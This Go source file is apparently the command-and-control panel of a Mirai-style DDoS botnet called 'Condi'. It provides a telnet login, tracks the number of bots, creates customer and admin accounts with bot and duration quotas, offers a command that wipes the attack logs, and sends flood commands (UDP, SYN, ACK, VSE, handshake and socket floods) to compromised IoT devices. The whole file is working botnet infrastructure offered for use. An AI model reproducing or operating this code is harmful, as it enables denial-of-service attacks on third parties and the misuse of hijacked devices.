package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "io/ioutil"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    headerb, err := ioutil.ReadFile("prompt.txt")
    if err != nil {
        return
    }

    header := string(headerb)
    this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[34;1mUsername\033[33;3m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[34;1mPassword\033[33;3m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;1mCHECKING... \033[31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[32;1mCondi boatnet v6\r\n"))
        this.conn.Write([]byte("\033[31mYour account has been locked. (press any key)\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    time.Sleep(1 * time.Second)

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d\007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    this.conn.Write([]byte("\033[2J\033[1H\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;36m   / /__\r\n"))
    this.conn.Write([]byte("\x1b[1;36m  (    @/___ \x1b[1;31mCondi version 6\r\n"))
    this.conn.Write([]byte("\x1b[1;36m  /         O\r\n"))
    this.conn.Write([]byte("\x1b[1;36m /   (_____/\r\n"))
    this.conn.Write([]byte("\x1b[1;36m/_____/   U\r\n"))
    this.conn.Write([]byte("\r\n\r\n"))

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[32;1m" + username + "@botnet# \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
        botCount = userInfo.maxBots

        if err != nil || cmd == "cls" || cmd == "clear" {
    this.conn.Write([]byte("\033[2J\033[1H\x1b[0m"))
    this.conn.Write([]byte("\x1b[1;36m   / /__\r\n"))
    this.conn.Write([]byte("\x1b[1;36m  (    @/___ \x1b[1;31mCondi version 6\r\n"))
    this.conn.Write([]byte("\x1b[1;36m  /         O\r\n"))
    this.conn.Write([]byte("\x1b[1;36m /   (_____/\r\n"))
    this.conn.Write([]byte("\x1b[1;36m/_____/   U\r\n"))
    this.conn.Write([]byte("\r\n\r\n"))
            continue
        }

        if cmd == "help" || cmd == "methods" || cmd == "?" {
            this.conn.Write([]byte("\x1b[1;36mPreset\x1b[1;31m: \x1b[1;36m!udp \x1b[1;31m<target> <duration> \x1b[1;36mdport=\x1b[1;31m<port>\r\n"))
            this.conn.Write([]byte("\x1b[1;36mExample\x1b[1;31m: \x1b[1;36m!udp \x1b[1;31m1.1.1.1 60 \x1b[1;36mdport=\x1b[1;31m80\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;36mudp \x1b[1;37m- UDP Flooding, DGRAM UDP with less PPS Speed\r\n"))
            this.conn.Write([]byte("\x1b[1;36msyn \x1b[1;37m- TCP Flooding with syn flag\r\n"))
            this.conn.Write([]byte("\x1b[1;36mack \x1b[1;37m- TCP Flooding with ack flag\r\n"))
            this.conn.Write([]byte("\x1b[1;36mvse \x1b[1;37m- Good method for game servers\r\n"))
            this.conn.Write([]byte("\x1b[1;36mplain \x1b[1;37m- UDP Flood with less options, optimized for high GB/s\r\n"))
            this.conn.Write([]byte("\x1b[1;36mstomp \x1b[1;37m- TCP Handshake flood\r\n"))
            this.conn.Write([]byte("\x1b[1;36msocket \x1b[1;37m- High socket/s flood\r\n"))
            this.conn.Write([]byte("\x1b[1;36mudpbypass \x1b[1;37m- UDP Flooding optimized for bypassing\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }

         if err != nil || cmd == "logout" || cmd == "exit" {
            return
        }

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("-1 for Full Bots.\r\n"))
            this.conn.Write([]byte("Allowed Bots: "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for Max attack duration. \r\n"))
            this.conn.Write([]byte("Allowed Duration: "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for no cooldown. \r\n"))
            this.conn.Write([]byte("Cooldown: "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("Username: " + new_un + "\r\n"))
            this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
            this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
            this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
            this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
            this.conn.Write([]byte(""))
            this.conn.Write([]byte("Confirm(y): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte("Failed to create Admin! \r\n"))
            } else {
                this.conn.Write([]byte("Admin created! \r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "removelogs"  {
            this.conn.Write([]byte("\033[1;91mClear attack logs\033[1;33m?(y/n): \033[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CleanLogs() {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
            } else {
                this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
                fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + username + " \033[1;91m!\r\n")
            }
            continue 
        }
        
        if userInfo.admin == 1 && cmd == "remove" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if !database.removeUser(new_un) {
                this.conn.Write([]byte("User doesn't exists.\r\n"))
            } else {
                this.conn.Write([]byte("User removed\r\n"))
            }
            continue
        }
        
        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter New Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Choose New Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter Bot Count (-1 For Full Bots): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Max Attack Duration (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m User Added Successfully.\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "bots" && cmd == "botcount" {
            botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\x1b[1;37m: %d\033[0m\r\n", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mTotal botcount\x1b[1;31: %d\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {

                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mSent command to \x1b[1;31m%d \x1b[1;37miot servers\r\n", clientList.Count())))
                    clientList.QueueBuf(buf, botCount, botCatagory)

                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
